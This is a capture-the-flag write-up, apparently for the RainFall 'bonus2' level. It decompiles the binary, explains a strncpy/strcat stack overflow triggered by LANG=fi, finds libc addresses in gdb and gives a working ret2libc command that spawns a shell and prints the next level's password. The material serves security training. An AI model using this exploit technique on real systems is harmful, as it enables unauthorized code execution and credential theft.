## Step 1: Static & Dynamic Analysis

```c
0804873d  data_804873d:
0804873d                                         66 69 00               fi.
08048740  data_8048740:
08048740  6e 6c 00                                         nl.

08048484    int32_t greetuser()
08048484    {
08048484        uint32_t language_1 = language;
08048492        int32_t str;
08048492        
08048492        if (language_1 == 1)
08048492        {
080484c4            __builtin_memcpy(&str, "\x48\x79\x76\xc3\xa4\xc3\xa4\x20\x70\xc3\xa4\x69\x76\xc3\xa4\xc3\xa4\x20", 18);
080484e4            char var_3a_1 = 0;
08048492        }
08048492        else if (language_1 == 2)
080484f3            __builtin_strcpy(&str, "Goedemiddag! ");
08048497        else if (!language_1)
080484a7            __builtin_strncpy(&str, "Hello ", 7);
080484a7        
08048517        strcat(&str, &name);
08048528        return puts(&str);
08048484    }

08048529    int32_t main(int32_t argc, char** argv, char** envp)
08048529    {
08048529        if (argc != 3)
0804855a            return 1;
0804855a        
0804855a        void buff;
0804855a        __builtin_memset(&buff, 0, 76);
08048564        size_t size = 40;
0804856c        char* arg = argv[1];
08048574        void* tmp = &buff;
08048577        strncpy(tmp, arg, size);
08048584        size_t size2 = 32;
0804858c        arg = argv[2];
08048597        void buff2;
08048597        tmp = &buff2;
0804859a        strncpy(tmp, arg, size2);
0804859f        tmp = "LANG";
080485a6        char* lang_value = getenv(tmp);

080485ba        if (lang_value)
080485ba        {
080485bc            size_t lang_size = 2;
080485c4            arg = &data_804873d;
080485d3            tmp = lang_value;
080485d3            
080485dd            if (memcmp(tmp, arg, lang_size))
080485dd            {
080485eb                size_t var_a8_1 = 2;
080485f3                arg = &data_8048740;
08048602                tmp = lang_value;
08048602                
0804860c                if (!memcmp(tmp, arg, var_a8_1))
0804860e                    language = 2;
080485dd            }
080485dd            else
080485df                language = 1;
080485ba        }
080485ba        
08048629        __builtin_memcpy(&tmp, &buff, 76);
0804862b        return greetuser();
08048529    }
```

### Explanation

The `main()` function takes two arguments and checks for an environment variable named `LANG` to determine a language setting.

The first and second arguments are set into `buff` (`40` bytes max) and `buff2` (`32` bytes max).
The first argument is going to be passed `greetuser()` that will use `strcat()` to concatenate the paramterer to a string on the stack: `"Goedemiddag!"` if `LANG` is set with `nl`, `"Hyvää päivää"` if `LANG` is set with `fi`, or `"Hello"` by default.

```bash
(gdb) x/24wx $esp
0xbffffb70:    0xbffffb80    0xbffffbd0    0x00000001    0x00000000
0xbffffb80:    0x6c6c6548    0x4141206f    0x41414141    0x41414141
0xbffffb90:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffba0:    0x41414141    0x41414141    0x41414141    0x42424141
0xbffffbb0:    0x42424242    0x42424242    0x42424242    0x42424242
0xbffffbc0:    0x77777777    0x77777777    0x77777777    0x08048600
```

We can see here that `0x41414141` and `0x42424242` are not separated by a null bytes.
This is because `buff` and `buff1` are stored next to each other in the stack, and if an input bigger than `40` bytes is given to the first `strncpy()`, the string won't end with a null bytes.

When the final `strcat()` is called, it will concatenate the `str` and `buff` variables, however because of the lack of null terminated character at the end of `buff`, `buff_1` will also be read by `strcat()`. With the presence of the `18` chars already present in `str` if we are in the `fi` condition, a buffer overflow in `str` will occur and enabling us to overwrite the return address of `greetuser()` and perform a `ret2libc` attack.

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>

(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>

(gdb) info proc map
process 2892
Mapped address spaces:
	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
	 0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
	0xb7e2b000 0xb7e2c000     0x1000        0x0 
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7fd2000 0xb7fd5000     0x3000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]

(gdb) find 0xb7e2c000,0xb8000000,"/bin/sh"
0xb7f8cc58
```

## Step 2: Exploiting the Binary

```bash
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ ./bonus2 $(python -c "print('A' * 40)") $(python -c "print('B' * 18 + '\xb7\xe6\xb0\x60'[::-1] + '\xb7\xe5\xeb\xe0'[::-1] + '\xb7\xf8\xcc\x58'[::-1])")
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`�����X���

$  cat /home/user/bonus3/.pass         
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
